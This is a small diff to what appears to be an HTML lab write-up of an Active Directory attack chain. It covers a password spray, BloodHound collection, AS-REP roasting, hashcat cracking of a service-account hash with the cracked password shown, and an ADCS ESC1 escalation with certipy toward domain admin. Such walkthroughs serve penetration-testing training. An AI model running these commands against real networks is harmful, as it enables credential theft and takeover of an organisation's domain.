@@ -612,7 +612,8 @@ nxc smb 10.10.10.5 -u users.txt -p 'Megacorp2024!' --continue-on-success
           <pre>bloodhound-python -u jsmith -p 'Megacorp2024!' -d megacorp.local -dc-ip 10.10.10.5 -c All --zip
 impacket-GetNPUsers megacorp.local/ -usersfile users.txt -request -dc-ip 10.10.10.5
 # Got AS-REP hash for svc_backup
-hashcat -m 18200 asrep.txt rockyou.txt → Backup@2024</pre>
+hashcat -m 18200 asrep.txt rockyou.txt
+# Cracked: svc_backup:Backup@2024</pre>
           <h4>Step 4: ADCS ESC1 → DA</h4>
           <pre>certipy find -u svc_backup@megacorp.local -p 'Backup@2024' -dc-ip 10.10.10.5 -vulnerable -stdout
 # ESC1: Template "EmployeeCert"
